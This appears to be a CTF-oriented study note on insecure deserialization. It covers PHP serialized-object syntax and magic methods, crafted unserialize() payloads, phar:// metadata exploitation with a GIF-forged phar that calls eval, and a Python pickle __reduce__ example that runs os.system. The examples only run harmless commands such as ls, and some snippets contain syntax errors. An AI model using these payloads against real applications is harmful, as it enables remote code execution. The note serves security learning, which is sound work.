# Unserialization
Vulnerability of unserialization exists in many program languages，please remember the basic concept：**serialize：convert object to the string; unserialize：convert string to the object**.  
*  [PHP Unserialization](#php-unserialization)  
   *  [Serialization vs Unserialization](#serialization-vs-unserialization)  
   *  [Magic Function](#magic-function)  
   *  [Exploit](#exploit)    
   *  [Reference](#reference1)  
   *  [unserialize with phar](#unserialize-with-phar)  
   *  [what is phar?](#what-is-phar)  
   *  [how to exploit?](#how-to-exploit)  
   *  [Reference](#reference2)  
*  [Python Unserialization](#python-unserialization)  
   *  [Magic Function](#magic-function)  
   *  [Exploit](#exploit)  
   *  [Reference](#reference3)
  

# PHP Unserialization
It's always used in Cookie and session. If the parameter of `unserialize()` can be controlled，we can build up a payload to overwrite specific variable or change control flow.  

## Serialization vs Unserialization
Basically speaking：  
`serialize()`: convert object to string
`unserialize()`: convert string to object  
```php
class pwnch(){
  $test = "helloworld";
  function __wakeup(){
      echo "hello again";
  }
}
echo serialize(new pwnch());   // OUTPUT: O:5:"pwnch":1:{s:4:"test";s:10:"helloworld";}
```
OUTPUT: `O` means object, `5` is the length of object name. `1` is the size of attribute, `4` is the length of variable name, format is `key:value`.  

Type | Syntax  
------------ | -------------  
String | `s:size:value;`  
Integer | `i:value;`  
Boolean | `b:value;`  
NULL | `N;`  
Array | `a:size:{key-type:key-value;value-type:value-value;}`  
Object | `O:strlen(Object):class-name:object size:`  
------------ | -------------  
public | `{s:4:"test"}`  
private | `{s:11:"%00pwnch%00test"}`  
protected | `{s:7:"%00*%00test"}`  

## Magic Function
* `construct()`: called when new a object，but won't be called when unserialize()  
* `destruct()`: called when destroy a object，also be called when unserialize  
* `__sleep()`: run at the first moment of serialize  
* `__wakeup()`: run at the first moment of unserialize  

## Exploit
payload
```php
unserialize($_GET[1]);

1 = O:5:"pwnch":1:{s:4:"test";s:length of your code:"code you want to insert";}

// Here you can overwrite the variable test，remember to modify the lenght of your code  

// find your own gadget  

1 = O:5:"pwnch":1:{s:4:"test";O:6:"pwnch2":1{s:5:"test2";s:10:"echo `ls`;";}}

// In second payload, I overwrite the constructor in variable test with pwnch2，then overwrite the variable test2 in pwnch2 because I need the function in pwn2!
```
Tools:  
* [php online tool](https://1024tools.com/unserialize)

## Reference1
1. [chybeta's blog](https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  

## unserialize With phar
Sam Thomas published a new way to trigger a unserialization without use of `unserialize()` in blackhat 2018. This can be done with stream wrapper of `phar://`.  
Trace to the kernel of PHP, we can find that `meta-data` would be unserialized when library function use `phar://` to parse the document. Therefore, we can build up a malicious phar document and pass to file functions such as:  
```php
// file(phar://) -> unserialization
// from now on, magic function are not limited to unserialize() anymore :)
file_exists, file_get_contents, file_put_contents, file, fopen, is_dir, is_executable, is_file, is_link, is_readable, is_writable, copy, unlink, stat, readfile
```  
Just a little test can prove the concept:  
```php
class Test {
        public function __destruct() {
            echo 'unserialization happen!';
      }
}

file_exists($filename);
// $filename = phar://uploaded/xxx.gif
```  
Then you can see **unserialization happen!**.  

## What is phar
PHP can use phar to archive a file. A phar file can be separated into 4 parts: stub(`anything<?php blah; __HALT_COMPILER();?>`), manifest(which is the core of exploit), compressed contents, optional signature.  
```php
$p = new Phar('test.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'text');
$p->setStub('<?php __HALT_COMPILER(); ?>');

class HiClass{}
$o = new HiClass;
$o->data = '1pwnch';
$p->setMetadata($o);
$p->stopBuffering();
```
## How to exploit
Therefore, there are three requirements to implement it: `magic file function`, `uploadable file`, `phar:// is allowed`.  
1. We might not be able to upload the phar file to the website directly. However, we can add other header(stub) to forge it.  
```php
// generate phar
class Test {
   $var out = 'hello';
   function __destruct(){
        eval($this -> out);
   }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");     // forge to gif and upload to application?filename=phar://uploads/exp.gif
..........
```
[Find more detail here](http://blog.1pwnch.com/websecurity/2018/11/24/The-Magic-Power-of-Phar/#more)  

2. Trace any function: whether it **calls file open function** in the bottom side, then whether we can control its parameter. What's more interesting, it even can be used to make a DOS attack.  

## Reference2
1. [Blackhat议题解读 | 利用 phar 拓展 php 反序列化漏洞攻击面](https://www.anquanke.com/post/id/157657)  
2. [blackhat议题深入 | phar反序列化](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485159&idx=1&sn=50b2e94d2d6fc5f69c540113ae9b3f1c&chksm=e89e2e3fdfe9a729869444aa593e97b52970add524b219553f646e8af2aec06e25e8678e7dde&mpshare=1&scene=23&srcid=0822QPN3ZXccNvKuWTQoahLi#rd)

# Python unserialization
[關於模塊的細節我相當推這篇文章](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)  
Functions **pickle** and **cPickle** also can realize the function of serialization  
1. `cPickle.dumps`: object -> string  
2. `cPickle.loads`: string -> object  
You can also use dump/load，but I won't talk about it here.  
vulnerability of unserialization in python is more serious than in php，we can use this module to build RCE！  

## Magic Function
`reduce` will change the target of unserialization，therefore the parameter is controllable
```python
// magic function: reduce
import cPickle
import os

class People(object):

    def __init__(self,username,password):
        self.username = username
        self.password = password

    def __reduce__(self):
        return (os.system, ('ls',))

michael = People('admin','password')
print cPickle.loads(cPickle.dumps(michael))
// Output: ls (the result of ls
```  
We need `cPickle.loads` to trigger the vulnerability. His type of parameter is string，therefore we cannot use `cPickle.loads(michael)`，I use dumps to convert it inside.  

## Exploit
It's always combined with the web in CTF，such as `<?php system("echo $data | python vul.py")?>`. There might be a IO in `vul.py`，so I should deliver my data to the object with **magic function** which has been converted to string.  

## Reference3
1. [Python反序列化小记](https://www.jianshu.com/p/061d2c594d97)  
2. [序列化和反序列化模块pickle介绍 | Python库](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)
